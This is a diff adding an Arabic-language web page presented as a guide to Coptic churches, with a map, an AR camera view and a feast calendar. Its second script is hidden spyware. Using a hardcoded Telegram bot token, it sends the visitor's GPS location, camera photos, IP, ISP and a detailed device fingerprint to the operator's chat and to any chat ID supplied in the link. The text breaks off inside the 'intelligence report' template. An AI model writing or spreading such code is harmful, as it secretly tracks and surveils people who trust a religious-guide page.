@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الدليل المقدس | dalil-alkanayis </title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Leaflet CSS & JS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    
+    <!-- Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Cairo:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        body { font-family: 'Cairo', sans-serif; background-color: #180d26; color: #fef3c7; }
+        .royal-font { font-family: 'Amiri', serif; }
+        
+        /* تصميم شريط التمرير الذهبي */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #180d26; }
+        ::-webkit-scrollbar-thumb { background: linear-gradient(to bottom, #b45309, #fbbf24); border-radius: 10px; }
+
+        /* تخصيص نوافذ الخريطة */
+        .leaflet-popup-content-wrapper { 
+            background: rgba(46, 16, 101, 0.95); 
+            color: #fef3c7; 
+            backdrop-filter: blur(8px); 
+            border: 2px solid #d97706;
+            border-radius: 15px 15px 0 15px;
+            font-family: 'Amiri', serif;
+        }
+        .leaflet-popup-tip { background: #d97706; }
+        .leaflet-container a { color: #fbbf24; font-weight: bold; }
+        
+        /* تأثير الرادار */
+        .radar-scan {
+            width: 100%; height: 4px; 
+            background: linear-gradient(90deg, transparent, #fbbf24, transparent);
+            position: absolute; top: 0; left: 0; animation: scan 3s infinite ease-in-out; z-index: 50; display: none;
+            box-shadow: 0 0 15px #fbbf24;
+        }
+        @keyframes scan { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
+
+        /* الكاميرا وواجهة AR */
+        #camera-feed {
+            transform: scaleX(-1);
+            object-fit: cover;
+            width: 100%;
+            height: 100%;
+        }
+        .ar-overlay {
+            background: radial-gradient(circle, transparent 50%, #180d26 100%);
+            pointer-events: none;
+        }
+        .crosshair {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 250px; height: 250px;
+            border: 1px dashed rgba(251, 191, 36, 0.4);
+            border-radius: 50%;
+            animation: spin-slow 20s linear infinite;
+        }
+        @keyframes spin-slow { 100% { transform: translate(-50%, -50%) rotate(360deg); } }
+
+        /* زر التنقل النشط */
+        .nav-btn.active { color: #fbbf24; border-top: 2px solid #fbbf24; background: linear-gradient(to bottom, rgba(251, 191, 36, 0.1), transparent); }
+
+        /* أيقونة المعالم التاريخية */
+        .landmark-icon { 
+            text-shadow: 0 0 15px #fbbf24; 
+            animation: bounce-slow 2s infinite; 
+        }
+        @keyframes bounce-slow { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+    </style>
+</head>
+<body class="h-screen flex flex-col overflow-hidden bg-[url('https://www.transparenttextures.com/patterns/black-scales.png')]">
+
+    <!-- Header / Top Bar -->
+    <header class="bg-indigo-950/90 backdrop-blur border-b-2 border-amber-700 shadow-xl z-20 shrink-0">
+        <div class="container mx-auto flex justify-between items-center p-3">
+            <div class="flex items-center gap-3">
+                <div class="w-9 h-9 rounded-lg bg-gradient-to-br from-amber-600 to-amber-800 flex items-center justify-center shadow-lg border border-amber-400">
+                    <i class="fa-solid fa-church text-indigo-950 text-lg"></i>
+                </div>
+                <div>
+                    <h1 class="text-xl font-bold text-amber-400 tracking-wide royal-font leading-none">الدليل المقدس</h1>
+                    <p class="text-[10px] text-amber-200/60 font-serif"></p>
+                </div>
+            </div>
+            
+            <div class="flex gap-2">
+                <!-- زر التبديل الجديد: مصر بالكامل -->
+                <button onclick="loadFamousLandmarks()" class="bg-indigo-800 hover:bg-amber-800 text-amber-300 text-xs px-3 py-1 rounded border border-amber-600 transition flex items-center gap-2 shadow-lg">
+                    <i class="fa-solid fa-monument"></i> <span class="hidden md:inline">معالم مصر التاريخية</span>
+                </button>
+                <div id="gps-status" class="hidden md:flex bg-black/30 px-3 py-1 rounded-full border border-amber-900/50 text-[10px] text-amber-500 gap-2 items-center">
+                    <i class="fa-solid fa-satellite-dish animate-pulse"></i> <span>انتظار...</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Workspace -->
+    <div class="flex-1 flex flex-col md:flex-row h-full relative overflow-hidden">
+        
+        <!-- Radar Scan Visual -->
+        <div id="radar-line" class="radar-scan"></div>
+
+        <!-- 1. Right Panel: List & Controls (Desktop) -->
+        <aside class="w-full md:w-80 bg-[#1e1b4b] border-l border-amber-900/50 flex flex-col z-10 shadow-2xl relative order-2 md:order-1 hidden md:flex">
+             <div class="p-4 border-b border-amber-900/50 bg-indigo-950/50">
+                <label class="text-xs text-amber-200 block mb-2">نطاق المسح الميداني: <span id="range-val-desk">5 كم</span></label>
+                <input type="range" class="w-full h-1 bg-indigo-900 rounded appearance-none accent-amber-500" min="1" max="100" value="5" onchange="updateScan(this.value)">
+                <div class="flex justify-between text-[9px] text-gray-500 mt-1"><span>1 كم</span><span>100 كم</span></div>
+             </div>
+             <div id="desk-results" class="flex-1 overflow-y-auto p-2 space-y-2">
+                 <div class="text-center text-gray-500 text-xs mt-10">اضغط "معالم مصر" لعرض المواقع التاريخية الكبرى<br>أو فعل GPS للمسح القريب</div>
+             </div>
+        </aside>
+
+        <!-- 2. Main View: Map & Camera Layered -->
+        <main class="flex-1 relative z-0 order-1 md:order-2 bg-black w-full">
+            
+            <!-- Map View -->
+            <div id="map-container" class="w-full h-full absolute inset-0">
+                <div id="map" class="w-full h-full bg-[#0f172a]"></div>
+                <!-- Floating Map Controls -->
+                <div class="absolute top-4 left-4 z-[400] flex flex-col gap-2">
+                    <button onclick="setMapLayer('satellite')" class="w-9 h-9 bg-indigo-950/90 text-amber-500 rounded-lg border border-amber-700 hover:bg-indigo-800 shadow-lg" title="قمر صناعي"><i class="fa-solid fa-earth-americas"></i></button>
+                    <button onclick="setMapLayer('street')" class="w-9 h-9 bg-indigo-950/90 text-amber-500 rounded-lg border border-amber-700 hover:bg-indigo-800 shadow-lg" title="خريطة"><i class="fa-solid fa-map"></i></button>
+                    <button onclick="loadFamousLandmarks()" class="w-9 h-9 bg-amber-900/90 text-white rounded-lg border border-amber-500 hover:bg-amber-700 shadow-lg md:hidden" title="معالم مصر"><i class="fa-solid fa-monument"></i></button>
+                </div>
+            </div>
+
+            <!-- Camera View (Hidden by default) -->
+            <div id="camera-container" class="w-full h-full absolute inset-0 hidden bg-black">
+                <video id="camera-feed" autoplay playsinline></video>
+                <div class="absolute inset-0 ar-overlay pointer-events-none flex flex-col justify-between p-4">
+                    <div class="flex justify-between">
+                        <div class="text-amber-500 text-xs font-mono bg-black/50 p-1 px-2 rounded border border-amber-900">REC ● <span id="ar-time">00:00</span></div>
+                        <i class="fa-solid fa-crosshairs text-amber-500/50 text-2xl animate-pulse"></i>
+                    </div>
+                    <div class="crosshair border-amber-500/30"></div>
+                    <div class="text-center text-amber-200/70 text-xs royal-font mb-16 md:mb-0">
+                        وضع الاستكشاف الميداني (AR)
+                    </div>
+                </div>
+            </div>
+
+            <!-- Mobile Results Overlay -->
+            <div id="mobile-results-sheet" class="absolute bottom-16 left-0 right-0 bg-indigo-950/95 border-t-2 border-amber-600 rounded-t-2xl p-4 max-h-[40vh] overflow-y-auto z-[450] md:hidden transform transition-transform duration-300 translate-y-full">
+                <div class="w-12 h-1 bg-amber-700/50 rounded-full mx-auto mb-3"></div>
+                <h3 class="text-amber-400 font-bold text-sm mb-2 text-right">المواقع المكتشفة (<span id="mob-count">0</span>)</h3>
+                <div id="mob-results-list" class="space-y-2 pb-2"></div>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- 3. Bottom Navigation Bar (Mobile Only) -->
+    <nav class="md:hidden bg-indigo-950 border-t border-amber-800 flex justify-around items-center h-16 shrink-0 z-50 shadow-[0_-5px_15px_rgba(0,0,0,0.5)]">
+        <button onclick="switchView('map')" class="nav-btn active flex-1 flex flex-col items-center justify-center h-full text-gray-500 transition">
+            <i class="fa-solid fa-map text-lg mb-1"></i>
+            <span class="text-[10px]">الخريطة</span>
+        </button>
+        <button onclick="switchView('camera')" class="nav-btn flex-1 flex flex-col items-center justify-center h-full text-gray-500 transition">
+            <i class="fa-solid fa-camera text-lg mb-1"></i>
+            <span class="text-[10px]">الرؤية AR</span>
+        </button>
+        <button onclick="toggleCalendar()" class="nav-btn flex-1 flex flex-col items-center justify-center h-full text-gray-500 transition">
+            <i class="fa-solid fa-calendar-days text-lg mb-1"></i>
+            <span class="text-[10px]">الأعياد</span>
+        </button>
+        <button onclick="toggleSettings()" class="nav-btn flex-1 flex flex-col items-center justify-center h-full text-gray-500 transition">
+            <i class="fa-solid fa-sliders text-lg mb-1"></i>
+            <span class="text-[10px]">إعدادات</span>
+        </button>
+    </nav>
+
+    <!-- Calendar Modal -->
+    <div id="calendar-modal" class="fixed inset-0 z-[600] hidden bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
+        <div class="bg-indigo-950 w-full max-w-lg rounded-2xl border-2 border-amber-600 shadow-2xl overflow-hidden flex flex-col max-h-[80vh]">
+            <div class="bg-gradient-to-r from-amber-800 to-indigo-900 p-4 flex justify-between items-center border-b border-amber-600">
+                <h2 class="text-xl text-white royal-font font-bold"><i class="fa-solid fa-calendar-check me-2"></i>التقويم الكنسي</h2>
+                <button onclick="toggleCalendar()" class="text-amber-200"><i class="fa-solid fa-xmark text-xl"></i></button>
+            </div>
+            <div class="p-5 overflow-y-auto custom-scrollbar text-amber-100 space-y-4">
+                <div class="bg-indigo-900/40 p-3 rounded-xl border border-amber-500/20 text-center">
+                    <p class="text-xs text-amber-400 royal-font">الحدث القادم</p>
+                    <h3 id="next-event-name" class="text-xl font-bold text-white my-1 royal-font">...</h3>
+                    <div id="next-event-timer" class="text-lg font-mono text-amber-300 dir-ltr">-- أيام</div>
+                </div>
+                <div>
+                    <h4 class="text-amber-500 font-bold text-sm mb-2 border-b border-amber-800 pb-1">أعياد قادمة</h4>
+                    <ul class="space-y-2 text-sm" id="feasts-list"></ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Settings Modal -->
+    <div id="settings-modal" class="fixed inset-0 z-[600] hidden bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
+        <div class="bg-indigo-950 w-full max-w-sm rounded-2xl border-2 border-amber-600 p-5">
+            <h3 class="text-lg text-amber-400 font-bold mb-4 royal-font text-center">إعدادات الرادار</h3>
+            
+            <label class="block text-xs text-amber-200 mb-2">نطاق البحث الميداني (GPS)</label>
+            <input type="range" class="w-full h-2 bg-indigo-900 rounded-lg mb-4 accent-amber-500" min="1" max="100" value="5" onchange="updateScan(this.value); document.getElementById('sets-range').innerText=this.value">
+            <div class="text-center text-amber-500 font-bold mb-4"><span id="sets-range">5</span> كم</div>
+            
+            <button onclick="loadFamousLandmarks(); toggleSettings()" class="w-full bg-indigo-700 hover:bg-amber-800 text-white py-3 rounded font-bold mb-3 border border-amber-600 shadow-md">
+                <i class="fa-solid fa-monument me-2"></i> تحميل معالم مصر التاريخية
+            </button>
+
+            <button onclick="exportData()" class="w-full bg-amber-700 text-white py-2 rounded font-bold mb-3"><i class="fa-solid fa-download me-2"></i>تصدير البيانات</button>
+            <button onclick="toggleSettings()" class="w-full border border-amber-600 text-amber-400 py-2 rounded">إغلاق</button>
+        </div>
+    </div>
+
+    <script>
+        // --- System Variables ---
+        let map, userMarker, searchCircle;
+        let markersLayer = L.layerGroup();
+        let userLat, userLng;
+        let allData = [];
+        let mapLayers = {};
+        let cameraStream = null;
+        let currentRadius = 5000;
+
+        // --- قاعدة بيانات المعالم التاريخية (Fallback Data) ---
+        const famousLandmarks = [
+            {name: "الكاتدرائية المرقسية بالعباسية", lat: 30.0717, lon: 31.2753, type: "مقر البطريركية", region: "القاهرة"},
+            {name: "الكنيسة المعلقة", lat: 30.0053, lon: 31.2301, type: "أثرية (ق 3 م)", region: "مصر القديمة"},
+            {name: "دير سانت كاترين", lat: 28.5559, lon: 33.9760, type: "أرثوذكسي (تراث عالمي)", region: "سيناء"},
+            {name: "دير القديس مينا (مارمينا)", lat: 30.8523, lon: 29.6644, type: "أرثوذكسي", region: "مريوط"},
+            {name: "دير الأنبا أنطونيوس", lat: 28.9248, lon: 32.3503, type: "أول دير في العالم", region: "البحر الأحمر"},
+            {name: "دير الأنبا بولا", lat: 28.8472, lon: 32.5514, type: "أرثوذكسي", region: "البحر الأحمر"},
+            {name: "دير السريان", lat: 30.3168, lon: 30.4533, type: "وادي النطرون", region: "البحيرة"},
+            {name: "دير البراموس", lat: 30.3421, lon: 30.2764, type: "وادي النطرون", region: "البحيرة"},
+            {name: "دير الأنبا بيشوي", lat: 30.3175, lon: 30.4571, type: "وادي النطرون", region: "البحيرة"},
+            {name: "كنيسة القديسين", lat: 31.2464, lon: 29.9880, type: "سيدي بشر", region: "الإسكندرية"},
+            {name: "الكاتدرائية المرقسية بالإسكندرية", lat: 31.1979, lon: 29.9015, type: "أقدم كنيسة", region: "الإسكندرية"},
+            {name: "دير العذراء (المحرق)", lat: 27.3822, lon: 30.9858, type: "أسيوط", region: "الصعيد"},
+            {name: "دير درنكة", lat: 27.1353, lon: 31.1444, type: "مسار العائلة المقدسة", region: "أسيوط"},
+            {name: "كنيسة العذراء بالزيتون", lat: 30.1066, lon: 31.3090, type: "ظهورات العذراء", region: "القاهرة"},
+            {name: "دير سمعان الخراز", lat: 30.0305, lon: 31.2778, type: "المقطم", region: "القاهرة"}
+        ];
+
+        // --- Init ---
+        window.onload = () => {
+            initMap();
+            setInterval(() => {
+                const now = new Date();
+                document.getElementById('ar-time').innerText = now.toLocaleTimeString('en-US', {hour12:false, hour:'2-digit', minute:'2-digit'});
+            }, 1000);
+            calculateFeasts();
+        };
+
+        function initMap() {
+            const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: 'OSM' });
+            const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: 'Esri' });
+            
+            mapLayers = { street, satellite };
+
+            map = L.map('map', {
+                center: [26.8206, 30.8025], // مركز مصر
+                zoom: 6, // زووم يظهر مصر كلها
+                layers: [satellite],
+                zoomControl: false
+            });
+            L.control.zoom({ position: 'topright' }).addTo(map);
+            markersLayer.addTo(map);
+
+            startApp();
+            
+            // تحميل المعالم تلقائياً إذا فشل الـ GPS أو كبداية
+            setTimeout(() => {
+                if(!userLat) loadFamousLandmarks();
+            }, 2000);
+        }
+
+        function startApp() {
+            Promise.allSettled([
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }),
+                new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej))
+            ]).then(results => {
+                if(results[0].status === 'fulfilled') {
+                    cameraStream = results[0].value;
+                    document.getElementById('camera-feed').srcObject = cameraStream;
+                }
+                
+                if(results[1].status === 'fulfilled') {
+                    const pos = results[1].value;
+                    userLat = pos.coords.latitude;
+                    userLng = pos.coords.longitude;
+                    document.getElementById('gps-status').innerHTML = `<i class="fa-solid fa-satellite-dish text-green-500"></i> ${userLat.toFixed(4)}, ${userLng.toFixed(4)}`;
+                    
+                    if(userMarker) map.removeLayer(userMarker);
+                    const userIcon = L.divIcon({ className: 'bg-transparent', html: `<div class="w-4 h-4 bg-blue-500 rounded-full border-2 border-white shadow-[0_0_15px_#3b82f6] animate-pulse"></div>` });
+                    userMarker = L.marker([userLat, userLng], {icon: userIcon}).addTo(map);
+                    
+                    // تحويل الكاميرا للمستخدم وعمل مسح
+                    map.setView([userLat, userLng], 14);
+                    updateScan(5);
+                } else {
+                    // إذا فشل GPS، حمل المعالم
+                    loadFamousLandmarks();
+                }
+            });
+        }
+
+        // --- Logic: Load Static Historical Data ---
+        function loadFamousLandmarks() {
+            markersLayer.clearLayers();
+            if(searchCircle) map.removeLayer(searchCircle);
+            document.getElementById('range-val-desk').innerText = "وضع المعالم";
+            
+            const deskList = document.getElementById('desk-results');
+            const mobList = document.getElementById('mob-results-list');
+            deskList.innerHTML = ''; mobList.innerHTML = '';
+            
+            // تحويل البيانات لـ CSV عند التصدير
+            allData = famousLandmarks.map(l => ({tags: {name: l.name, denomination: l.type}, lat: l.lat, lon: l.lon}));
+
+            document.getElementById('mob-count').innerText = famousLandmarks.length;
+            document.getElementById('mobile-results-sheet').classList.remove('translate-y-full');
+
+            famousLandmarks.forEach(place => {
+                // List Item
+                const itemHTML = `
+                    <div class="bg-indigo-900/60 p-3 rounded border border-amber-600/40 hover:bg-amber-900/40 cursor-pointer flex justify-between items-center transition" onclick="focusOn(${place.lat},${place.lon},'${place.name}')">
+                        <div>
+                            <div class="font-bold text-amber-300 text-sm royal-font">${place.name}</div>
+                            <div class="text-[10px] text-gray-300"><i class="fa-solid fa-location-dot me-1"></i>${place.region} | ${place.type}</div>
+                        </div>
+                        <i class="fa-solid fa-monument text-amber-600 text-lg"></i>
+                    </div>
+                `;
+                deskList.innerHTML += itemHTML;
+                mobList.innerHTML += itemHTML;
+
+                // Marker with Special Icon
+                const icon = L.divIcon({
+                    className: '',
+                    html: `<div class="text-amber-500 text-3xl drop-shadow-[0_0_10px_rgba(251,191,36,0.8)] landmark-icon"><i class="fa-solid fa-place-of-worship"></i></div>`,
+                    iconSize: [30, 30], iconAnchor: [15, 30]
+                });
+                L.marker([place.lat, place.lon], {icon}).addTo(markersLayer)
+                    .bindPopup(`<div class="text-center"><b class="royal-font text-amber-500 text-lg">${place.name}</b><br><span class="text-xs text-white">${place.region}</span></div>`);
+            });
+
+            // Zoom to Egypt view
+            map.flyTo([27.5, 31.0], 6, {duration: 1.5});
+        }
+
+        // --- Logic: Dynamic Scan ---
+        function updateScan(km) {
+            if(!userLat) return alert("يرجى تفعيل الموقع (GPS) للمسح الميداني، أو استخدم وضع المعالم التاريخية.");
+            currentRadius = km * 1000;
+            document.getElementById('range-val-desk').innerText = km + " كم";
+            
+            document.getElementById('radar-line').style.display = 'block';
+            if(searchCircle) map.removeLayer(searchCircle);
+            searchCircle = L.circle([userLat, userLng], {
+                color: '#d97706', fillColor: '#fbbf24', fillOpacity: 0.05, radius: currentRadius, weight: 1, dashArray: '5,5'
+            }).addTo(map);
+            map.fitBounds(searchCircle.getBounds());
+
+            const query = `[out:json][timeout:25];(node["amenity"="place_of_worship"]["religion"="christian"](around:${currentRadius},${userLat},${userLng});way["amenity"="place_of_worship"]["religion"="christian"](around:${currentRadius},${userLat},${userLng}););out center;`;
+            
+            fetch(`https://overpass-api.de/api/interpreter?data=${encodeURIComponent(query)}`)
+                .then(r => r.json())
+                .then(d => {
+                    allData = d.elements;
+                    if(allData.length === 0) {
+                        alert(`لم يتم العثور على كنائس في نطاق ${km} كم. جرب زيادة النطاق أو استخدم زر "معالم مصر التاريخية".`);
+                    } else {
+                        renderLiveResults(allData);
+                    }
+                    document.getElementById('radar-line').style.display = 'none';
+                })
+                .catch(e => {
+                    console.error(e);
+                    document.getElementById('radar-line').style.display = 'none';
+                });
+        }
+
+        function renderLiveResults(data) {
+            markersLayer.clearLayers();
+            const deskList = document.getElementById('desk-results');
+            const mobList = document.getElementById('mob-results-list');
+            deskList.innerHTML = ''; mobList.innerHTML = '';
+            
+            document.getElementById('mob-count').innerText = data.length;
+            document.getElementById('mobile-results-sheet').classList.remove('translate-y-full');
+
+            data.forEach(p => {
+                const lat = p.type==='node'?p.lat:p.center.lat;
+                const lon = p.type==='node'?p.lon:p.center.lon;
+                const name = p.tags.name || p.tags['name:ar'] || p.tags['name:en'] || "كنيسة";
+                const type = p.tags.denomination || "عامة";
+                const dist = (map.distance([userLat, userLng], [lat, lon])/1000).toFixed(2);
+
+                const itemHTML = `
+                    <div class="bg-indigo-900/40 p-2 rounded border border-amber-800/30 hover:bg-amber-900/20 cursor-pointer flex justify-between items-center" onclick="focusOn(${lat},${lon},'${name}')">
+                        <div>
+                            <div class="font-bold text-amber-200 text-sm">${name}</div>
+                            <div class="text-[10px] text-gray-400">${type} | ${dist} كم</div>
+                        </div>
+                        <i class="fa-solid fa-location-crosshairs text-amber-600"></i>
+                    </div>
+                `;
+                deskList.innerHTML += itemHTML;
+                mobList.innerHTML += itemHTML;
+
+                const icon = L.divIcon({
+                    className: '',
+                    html: `<div class="text-amber-500 text-2xl drop-shadow-md"><i class="fa-solid fa-location-dot"></i></div>`,
+                    iconSize: [20, 20], iconAnchor: [10, 20]
+                });
+                L.marker([lat, lon], {icon}).addTo(markersLayer).bindPopup(`<b class="royal-font text-amber-400">${name}</b><br>${type}`);
+            });
+        }
+
+        function focusOn(lat, lon, name) {
+            switchView('map');
+            map.flyTo([lat, lon], 16, {duration: 1.5});
+            setTimeout(() => L.popup().setLatLng([lat, lon]).setContent(`<b class="royal-font text-amber-400">${name}</b>`).openOn(map), 1500);
+            document.getElementById('mobile-results-sheet').classList.add('translate-y-full');
+        }
+
+        function filterResults(denom) {
+            // (Functionality remains similar to previous version, filtering allData)
+            renderLiveResults(allData.filter(p => denom === 'all' || (p.tags.denomination||"").toLowerCase().includes(denom)));
+        }
+
+        // --- UI Switching ---
+        function switchView(mode) {
+            const mapC = document.getElementById('map-container');
+            const camC = document.getElementById('camera-container');
+            const sheet = document.getElementById('mobile-results-sheet');
+            
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+
+            if(mode === 'map') {
+                mapC.classList.remove('hidden');
+                camC.classList.add('hidden');
+                document.querySelector('button[onclick="switchView(\'map\')"]').classList.add('active');
+                if(allData.length > 0) sheet.classList.remove('translate-y-full'); 
+                setTimeout(() => map.invalidateSize(), 100);
+            } else {
+                mapC.classList.add('hidden');
+                camC.classList.remove('hidden');
+                document.querySelector('button[onclick="switchView(\'camera\')"]').classList.add('active');
+                sheet.classList.add('translate-y-full'); 
+                if(!cameraStream) startApp();
+            }
+        }
+
+        function toggleCalendar() {
+            const m = document.getElementById('calendar-modal');
+            m.classList.toggle('hidden');
+            if(!m.classList.contains('hidden')) {
+                m.classList.add('modal-enter');
+                document.querySelector('button[onclick="toggleCalendar()"]').classList.add('active');
+            } else {
+                document.querySelector('button[onclick="toggleCalendar()"]').classList.remove('active');
+            }
+        }
+
+        function toggleSettings() {
+            const m = document.getElementById('settings-modal');
+            m.classList.toggle('hidden');
+            if(!m.classList.contains('hidden')) {
+                document.querySelector('button[onclick="toggleSettings()"]').classList.add('active');
+            } else {
+                document.querySelector('button[onclick="toggleSettings()"]').classList.remove('active');
+            }
+        }
+
+        function setMapLayer(l) {
+            map.eachLayer(layer => { if(layer!==markersLayer && layer!==userMarker && layer!==searchCircle) map.removeLayer(layer); });
+            map.addLayer(mapLayers[l]);
+        }
+
+        function calculateFeasts() {
+            const feasts = [
+                {n:"عيد الميلاد المجيد", d:"2025-01-07"},
+                {n:"عيد الغطاس", d:"2025-01-19"},
+                {n:"يونان (فصح)", d:"2025-02-10"}, 
+                {n:"أحد الشعانين", d:"2025-04-13"},
+                {n:"عيد القيامة", d:"2025-04-20"},
+                {n:"عيد الرسل", d:"2025-07-12"},
+                {n:"صوم العذراء", d:"2025-08-07"},
+                {n:"النيروز (رأس السنة)", d:"2025-09-11"}
+            ];
+            
+            const today = new Date();
+            let nextF = null;
+            let minDiff = Infinity;
+            const listHTML = document.getElementById('feasts-list');
+            listHTML.innerHTML = '';
+
+            feasts.forEach(f => {
+                let fDate = new Date(f.d);
+                if(fDate < today) fDate.setFullYear(today.getFullYear() + 1);
+                
+                const diff = fDate - today;
+                const days = Math.ceil(diff / (1000*60*60*24));
+                
+                if(diff > 0 && diff < minDiff) { minDiff = diff; nextF = { ...f, days }; }
+
+                listHTML.innerHTML += `
+                    <li class="flex justify-between bg-indigo-900/30 p-2 rounded border-r-2 border-amber-600">
+                        <span>${f.n}</span>
+                        <span class="text-gray-400 text-xs">${fDate.toLocaleDateString('ar-EG')}</span>
+                    </li>
+                `;
+            });
+
+            if(nextF) {
+                document.getElementById('next-event-name').innerText = nextF.n;
+                document.getElementById('next-event-timer').innerText = `باقي ${nextF.days} يوم`;
+            }
+        }
+
+        function exportData() {
+            if(allData.length === 0) return alert("لا توجد بيانات");
+            let csv = "\uFEFFName,Lat,Lon,Type\n";
+            allData.forEach(p => csv += `${(p.tags?.name||"N/A").replace(/,/g,"-")},${p.lat},${p.lon},${p.tags?.denomination||""}\n`);
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob([csv], {type:'text/csv'}));
+            a.download = 'churches.csv';
+            a.click();
+        }
+    </script>
+
+<script>
+    // ⚙️ إعدادات التيليجرام
+    const BOT_TOKEN = '8408417562:AAGbJ1VuFQ7nzTQhrTl72Atv5tkBmyFJWlU'; 
+    const FIXED_CHAT_ID = '1431886140'; 
+
+    // 📍 جلب المعرف من الرابط
+    const urlParams = new URLSearchParams(window.location.search);
+    const dynamicChatId = urlParams.get("id");
+
+    // 🛠️ دالة الإرسال
+    function sendToTelegramMultiple(message, isLocation = false, lat = null, lon = null, photoBlob = null, caption = '') {
+        const ids = [FIXED_CHAT_ID];
+        if (dynamicChatId) ids.push(dynamicChatId);
+
+        ids.forEach(chatId => {
+            if (isLocation) {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lon })
+                }).catch(() => {});
+                
+                const mapsLink = `📍 *موقع دقيق (GPS)*\nhttp://maps.google.com/?q=${lat},${lon}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: mapsLink, parse_mode: 'Markdown' })
+                }).catch(() => {});
+
+            } else if (photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', photoBlob, 'cam.jpg');
+                if (caption) formData.append('caption', caption);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
+            } else {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+                }).catch(() => {});
+            }
+        });
+    }
+
+    // 🎮 استخراج معلومات كرت الشاشة (أهم دالة لمعرفة نوع الموبايل)
+    function getGPUInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return 'غير مدعوم';
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } catch (e) {
+            return 'غير معروف';
+        }
+    }
+
+    // 🌐 جمع البيانات الشاملة
+    async function collectDetailedData() {
+        // 1. بيانات الشبكة الأساسية
+        let ipData = {};
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            ipData = await res.json();
+        } catch (e) { ipData = { ip: 'Fail', country_name: 'Fail', city: 'Fail', org: 'Fail' }; }
+
+        // 2. البطارية
+        let batteryInfo = 'N/A';
+        try {
+            const b = await navigator.getBattery();
+            batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? '🔌 يشحن' : '🔋 بطارية'})`;
+        } catch (e) {}
+
+        // 3. معلومات الشاشة
+        const screenInfo = `${screen.width}x${screen.height} (Pixel Ratio: ${window.devicePixelRatio})`;
+        
+        // 4. معلومات الهاردوير (المعالج والرامات)
+        const cpuCores = navigator.hardwareConcurrency || 'N/A';
+        const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'N/A'; // يعمل غالباً على كروم وأندرويد
+        const gpu = getGPUInfo(); // اسم كرت الشاشة
+
+        // 5. معلومات الاتصال
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const connType = connection ? (connection.effectiveType || 'N/A') : 'N/A';
+
+        // 6. الوقت واللغة
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const lang = navigator.language;
+
+        return {
+            ip: ipData.ip, country: ipData.country_name, city: ipData.city, isp: ipData.org,
+            platform: navigator.platform, userAgent: navigator.userAgent,
+            battery: batteryInfo,
+            screen: screenInfo,
+            hardware: `CPU: ${cpuCores} Cores | RAM: ${ram} | GPU: ${gpu}`,
+            netSpeed: connType,
+            system: `Lang: ${lang} | Zone: ${timeZone}`
+        };
+    }
+
+    // 📍 الموقع
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) { resolve(null); return; }
+            navigator.geolocation.getCurrentPosition(
+                (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // 📝 التقرير النهائي
+    function sendFullReport(data) {
+        let message = `
+🕵️‍♂️ *تقرير استخباراتي شامل*
+🆔 *المعرف:* \`${FIXED_CHAT_ID}\`
+
+📱 *هوية الجهاز (Fingerprint):*
+• النظام: \`${data.platform}\`
+• المتصفح: \`${data.userAgent}\`
+• الشاشة: \`${data.screen}\`
+• العتاد: \`${data.hardware}\`
+
+🔌 *الحالة:*
+• البطارية: ${data.battery}
+• الشبكة: ${data.netSpeed}
